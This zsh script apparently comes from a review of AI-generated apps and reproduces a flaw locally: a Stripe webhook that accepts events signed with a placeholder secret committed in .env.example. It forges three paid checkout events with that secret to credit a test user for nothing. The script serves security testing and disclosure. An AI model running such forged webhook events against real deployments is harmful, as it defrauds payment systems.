#!/bin/zsh
# The placeholder webhook secret break, reproducible without a Stripe account.
#
#   episodes/01-stripe-credits/check-env-secret.sh [opus | sonnet | haiku]
#
# This is the episode's lead finding. The AI's signature check is correct: an
# unsigned or wrongly signed event is rejected (see check.sh, step 1). But the
# build ships an .env.example with a PLACEHOLDER webhook secret, and nothing in
# the code refuses to run with it. Copy the example to .env, the way a hurried
# dev would, and the secret that "verifies" webhooks is a public string anyone
# can read in the repo. Forged events signed with it now pass, and the webhook
# credits straight from the signed payload (unlike the success page, which
# re-checks with stripe.checkout.sessions.retrieve).
#
# This script copies the build's own .env.example to .env, starts the app with
# exactly that config, then signs forged purchases with the placeholder secret
# taken from the same file.
set -uo pipefail
setopt nullglob

root=${0:A:h:h:h}
case ${1:-opus} in
  opus)   app=$root/apps/01-stripe-credits; schema=lib/db.ts; dbfile=app.db; hook=/api/webhooks/stripe ;;
  sonnet) app=$root/apps/01-stripe-credits-claude-sonnet-5-5; schema=lib/db.js; dbfile=data.db; hook=/api/webhook ;;
  haiku)  app=$root/apps/01-stripe-credits-claude-haiku-5-5; schema=src/lib/db.ts; dbfile=data/app.db; hook=/api/webhook ;;
  *) echo "usage: check-env-secret.sh [opus | sonnet | haiku]"; exit 2 ;;
esac
port=3104
url=http://localhost:$port$hook
sqlite=/usr/bin/sqlite3

work=$(mktemp -d)
cp -R "$app/." "$work/app" 2>/dev/null
cd "$work/app"
rm -rf app.db* data.db* data; mkdir -p "$(dirname $dbfile)"

# The junior-dev move: copy the example config verbatim.
rm -f .env .env.local
cp .env.example .env
secret=$(grep '^STRIPE_WEBHOOK_SECRET=' .env | cut -d= -f2-)
echo "STRIPE_WEBHOOK_SECRET copied from .env.example: $secret"
echo "(a public placeholder, committed in the repo for anyone to read)"

# Start the app on its own .env only. We do NOT pass the secret on the command
# line, so the webhook secret is whatever the example file holds.
npx next dev -p $port > "$work/server.log" 2>&1 &
server=$!
trap 'kill $server 2>/dev/null; pkill -P $server 2>/dev/null; rm -rf "$work"' EXIT
until curl -s -o /dev/null http://localhost:$port/login; do sleep 1; done

python3 -c 'import re,sys; print(re.search(r"db\.exec\(`(.*?)`", open(sys.argv[1]).read(), re.S).group(1))' $schema | $sqlite $dbfile
credits() { $sqlite $dbfile "SELECT credits FROM users WHERE id = 1"; }
send() { node "$root/tools/stripe-event.mjs" "$url" "$@"; }
echo "\n== new user, no payment"
$sqlite $dbfile "INSERT INTO users (email, password_hash) VALUES ('attacker@example.test', 'x')"
echo "credits: $(credits)"

echo "\n== the signature check still works: an unsigned forged event is rejected"
send --unsigned checkout.session.completed object.id=cs_unsigned payment_status=paid amount_total=2000 currency=usd payment_intent=pi_unsigned metadata.userId=1 metadata.packId=large
echo "credits: $(credits)"

echo "\n== but forged events SIGNED with the placeholder secret are accepted"
for i in 1 2 3; do
  send "$secret" checkout.session.completed id=evt_forged_$i object.id=cs_forged_$i payment_status=paid amount_total=2000 currency=usd payment_intent=pi_forged_$i metadata.userId=1 metadata.packId=large
done
echo "credits after three forged \$20 purchases, zero dollars paid: $(credits)"
echo "(repeat at will: there is no rate limit and no check back to Stripe on this path)"
